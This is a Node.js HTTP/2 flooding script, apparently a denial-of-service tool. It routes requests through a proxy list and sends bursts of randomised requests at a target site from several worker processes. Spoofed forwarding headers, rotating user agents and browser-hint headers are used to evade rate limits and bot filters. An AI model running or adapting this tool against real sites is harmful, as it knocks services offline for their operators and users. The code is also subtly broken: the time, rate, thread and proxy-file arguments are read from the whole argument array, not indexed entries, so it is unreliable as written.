const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require('user-agents');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
    console.log("Usage: target time rate thread proxyfile");
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean);
}
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}
function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}
function randStr(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv),
    rate: parseInt(process.argv),
    threads: parseInt(process.argv),
    proxyFile: process.argv
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'hmac_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pkcs1_sha1',
    'hmac_sha1'
];

const acceptHeader = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    '*/*',
    'image/*',
    'image/webp,image/apng,image/*,*/*;q=0.8',
    'application/json, text/javascript, */*; q=0.01',
    'application/xml, text/xml, */*',
    'application/pdf,application/x-pdf,application/vnd.ms-excel,application/vnd.ms-powerpoint',
    'text/css,*/*;q=0.1',
    'application/javascript, application/ecmascript, text/javascript',
    'application/ld+json, application/json',
    'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
];

const langHeader = [
    'en-US,en;q=0.9,fr-FR;q=0.8,de-DE;q=0.7',
    'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
    'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
    'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
    'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
];

const encodingHeader = [
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'identity',
    'compress',
    'br',
    'gzip',
    'compress, gzip',
];

const methods = ["GET", "HEAD", "POST", "PATCH", "DELETE"];

const cacheControl = [
    'max-age=0',
    'no-cache',
    'no-store',
    'must-revalidate',
    'no-transform',
    'public',
    'private',
    'max-stale=0',
    'min-fresh=60',
    'max-age=3600'
];

const secChUa = [
    '"Chromium";v="138", "Not/A)Brand";v="24"',
    '"Google Chrome";v="138", "Chromium";v="138", "Not/A)Brand";v="24"',
    '"Microsoft Edge";v="138", "Chromium";v="138", "Not/A)Brand";v="24"',
    '"Opera";v="90", "Chromium";v="138", "Not/A)Brand";v="24"',
    '"Brave";v="1", "Chromium";v="138", "Not/A)Brand";v="24"'
];

const secChUaPlatform = ["Linux", "Windows", "macOS", "Android", "iOS"];

const rateHeadersDynamic = [
    { "akamai-origin-hop": randStr(12) },
    { "proxy-client-ip": randStr(12) },
    { "via": randStr(12) },
    { "cluster-ip": randStr(12) },
    { "x-forwarded-for": `${randStr(3)}.${randStr(2)}.${randStr(2)}.${randStr(2)}` },
    { "forwarded": `for=${randStr(5)}; proto=https` },
];

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    console.clear();
    console.log('\x1b[1m\x1b[34mTarget:\x1b[0m\x1b[1m ' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[33mDuration:\x1b[0m\x1b[1m ' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[32mThreads:\x1b[0m\x1b[1m ' + args.threads + '\x1b[0m');
    console.log('\x1b[1m\x1b[31mRequests per second:\x1b[0m\x1b[1m ' + args.rate + '\x1b[0m');
} else {
    setInterval(runFlooder);
}

class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({ host: options.host, port: options.port, noDelay: true });
        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 1000);

        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            const response = chunk.toString();
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            callback(undefined, "error: timeout exceeded");
        });
        connection.on("error", error => {
            connection.destroy();
            callback(undefined, "error: " + error);
        });
    }
}
const netSocket = new NetSocket();

function generateUserAgent() {
    return new UserAgent({
        deviceCategory: randomElement(['desktop', 'mobile', 'tablet']),
        platform: randomElement(['Win32', 'MacIntel', 'Linux x86_64', 'iPhone', 'Android']),
        browserName: randomElement(['Chrome', 'Firefox', 'Edge', 'Opera'])
    }).toString();
}

function genHeaders() {
    return {
        ":method": randomElement(methods),
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path + "?" + randStr(10) + "=" + randStr(5),
        ":scheme": "https",
        "user-agent": generateUserAgent(),
        "accept": randomElement(acceptHeader),
        "accept-encoding": randomElement(encodingHeader),
        "accept-language": randomElement(langHeader),
        "cache-control": randomElement(cacheControl),
        "sec-ch-ua": randomElement(secChUa),
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": randomElement(secChUaPlatform),
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "x-requested-with": "XMLHttpRequest"
    };
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr) return;
    const [proxyHost, proxyPort] = proxyAddr.split(":");
    const proxyOptions = {
        host: proxyHost,
        port: parseInt(proxyPort),
        address: parsedTarget.host + ":443",
        timeout: 15
    };
    netSocket.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection && connection.close) connection.close();
            if (connection && connection.destroy) connection.destroy();
            return;
        }
        const tlsOptions = (Math.random() < 0.5) ? {
            secure: true,
            ALPNProtocols: ['h2'],
            sigalgs: randomElement(sig),
            socket: connection,
            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            ecdhCurve: 'P-256:P-384',
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false
        } : {
            secure: true,
            ALPNProtocols: ['h2'],
            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            ecdhCurve: 'auto',
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_TICKET |
                crypto.constants.SSL_OP_NO_COMPRESSION |
                crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                crypto.constants.SSL_OP_NO_RENEGOTIATION |
                crypto.constants.SSL_OP_SINGLE_DH_USE |
                crypto.constants.SSL_OP_SINGLE_ECDH_USE |
                crypto.constants.SSL_OP_NO_QUERY_MTU
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 50000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const intervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const headers = { ...genHeaders(), ...randomElement(rateHeadersDynamic) };
                    const req = client.request(headers);
                    req.on("response", () => {
                        req.close();
                        req.destroy();
                    });
                    req.end();
                }
            }, 250);

            setTimeout(() => {
                clearInterval(intervalAttack);
                client.close();
            }, args.time * 1000);
        });

        client.on("close", () => {
            client.destroy();
        });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);
